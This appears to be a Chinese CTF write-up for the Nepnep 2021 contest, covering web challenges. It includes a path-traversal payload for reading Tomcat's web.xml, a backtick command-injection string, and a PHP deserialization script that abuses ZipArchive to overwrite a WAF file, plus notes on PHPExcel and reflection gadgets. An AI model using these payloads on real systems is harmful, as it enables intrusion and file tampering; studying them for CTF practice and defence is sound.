## Nepnep 2021

小评价:题目原题比较多，payload好多通杀。不算上非预期的话，题目质量挺好的。

## 0x01 Easy_Tomcat  

注册源码读取，头像老梗了。

tomcat的常用目录

```
static/img/../../WEB-INF/web.xml
```



```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>LoginServlet</servlet-name>
        <servlet-class>javademo.LoginServlet</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>RegisterServlet</servlet-name>
        <servlet-class>javademo.RegisterServlet</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>AdminServlet</servlet-name>
        <servlet-class>javademo.AdminServlet</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>InitServlet</servlet-name>
        <servlet-class>javademo.InitServlet</servlet-class>
        <load-on-startup>1</load-on-startup>

    </servlet>
    <servlet-mapping>
        <servlet-name>LoginServlet</servlet-name>
        <url-pattern>/LoginServlet</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>RegisterServlet</servlet-name>
        <url-pattern>/RegisterServlet</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>AdminServlet</servlet-name>
        <url-pattern>/AdminServlet</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>InitServlet</servlet-name>
        <url-pattern>/InitServlet</url-pattern>
    </servlet-mapping>
</web-app>

```

## 0x02 little_trick

```
$nep=`$nep`;ls>z&len=7
```

我觉得这个解法太巧妙了，循环嵌套，直呼一个骚

## 0x03 梦里花开牡丹亭

```
<?php
class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;
    public  $file;
    public  $filename;
    public  $content;
    public function __construct($file,$register,$filename,$content,$username,$password){
        $this->file=$file;
        $this->register=$register;
        $this->filename=$filename;
        $this->content=$content;
        $this->username=$username;
        $this->password=$password;
    }
}
class login{
    public $file;
    public $filename;
    public $content;
    public function __construct($file,$filename,$content){
        $this->file=$file;
        $this->filename=$filename;
        $this->content=$content;
    }
}
class Open{

}

$Open=new Open();
$a =new ZipArchive();
#$Game=new Game($Open,'admin','php://filter/read=convert.base64-encode/resource=shell','o\t /flag','admin','admin');
$Game = new Game($a,"admin","waf.txt",ZipArchive::OVERWRITE,"admin","admin");
echo base64_encode(serialize($Game));
```

## 0x04 faka

借鉴wmctf的一道题

```
http://ff4e4f5e-5a03-4a6f-867a-dcb9d63c3133.node1.hackingfor.fun/static/upload/tmp/a108d8667a0b3ba6/28f4af46bc614b6b.jpg
```

![image-20210325115316698](https://i.loli.net/2021/03/25/SUgExDMkH4LpT8e.png)

![image-20210327084534291](https://i.loli.net/2021/03/27/EwopYCR1aV7UDfT.png)

![image-20210327084826265](https://i.loli.net/2021/03/27/mzeAHxs7qnaFOGc.png)

只要满足图中的条件就可以触发__call函数了。

或者直接简化为

```
$a=new PHPExcel_CachedObjectStorage_SQLite($_DBHandle,'123');//触发output的call
```

简简单单的午饭。其他地方就不跟着分析，大家继续玩。

## 0x05 bbxhh_revenge  

php5之后加入的新特性，利用php自带的原生类反射，来达到命令执行。

https://www.php.net/manual/zh/reflectionfunction.invokeargs.php

![image-20210327101610082](https://i.loli.net/2021/03/27/2ZPGLflBDerUWQJ.png)

## 0x06 梦⾥花开牡丹亭  

php 反序列化中 原生类的利用。